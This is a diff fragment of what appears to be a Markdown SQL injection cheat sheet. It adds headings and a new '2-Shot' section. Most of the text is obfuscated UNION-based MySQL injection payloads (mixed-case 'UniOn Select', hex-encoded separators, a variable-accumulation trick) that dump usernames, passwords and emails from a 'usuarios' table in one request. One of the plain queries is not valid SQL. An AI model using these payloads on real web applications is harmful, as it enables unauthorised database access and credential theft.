@@ -90,28 +90,41 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 
 #### Group Concat
 
-- MySQL Query:
+- `MySQL` Query:
 ````sql
 SELECT GROUP_CONCAT(username,password,mail,' ::: ') FROM usuarios;
 ````
 
-- Web + Offuscation
+- `SQLi`: Web + Offuscation
 ````py
 -1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,mail+SEPARATOR+0x3c62723e)+FROM+usuarios),5,6
 ````
 
 #### 1-Shot
 
-- MySQL Query:
+- `MySQL` Query:
 ````sql
 ## 1 shot
 SELECT * FROM usuarios CONCAT(username,password,mail);
 ````
 
-- Web + Offuscation
+- `SQLi`: Web + Offuscation
 ````py
 -1' UniOn Select 1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(usuarios)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x3a,password,0x3a,mail,0x3c62723e))))x),5,6
 ````
+
+#### 2-Shot
+
+- `MySQL` Query:
+````sql
+SELECT GROUP_CONCAT(username,password,mail) FROM usuarios;
+````
+
+- `SQLi`: Web + Offuscation
+````py
+-1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(0x3c62723e,username,password,mail)+FROM (usuarios)),5,6
+````
+
 ### 💉 Group Concat
 
 #### Basic
